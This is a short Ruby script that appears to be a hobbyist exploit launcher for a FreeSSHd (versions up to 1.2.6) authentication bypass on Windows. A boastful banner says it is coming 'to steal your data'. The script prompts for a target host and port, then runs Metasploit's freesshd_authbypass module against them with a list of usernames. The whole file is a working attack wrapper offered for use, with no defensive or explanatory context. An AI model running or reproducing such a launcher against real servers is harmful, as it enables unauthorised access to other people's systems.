puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

         Freesshd Authentication Bypass

	   Freesshd <= 1.2.6 / Windows (Universal)

        Starting Port:: 22   

"""

puts " [?] What is the target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Start with 22]  "
print "[!] ---> "

port = gets.chomp


exec("msfconsole -x 'use exploit/windows/ssh/freesshd_authbypass' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set USER_FILE /home/parrot/Desktop/MyExploits/Users.txt' -x 'run' 'run'")
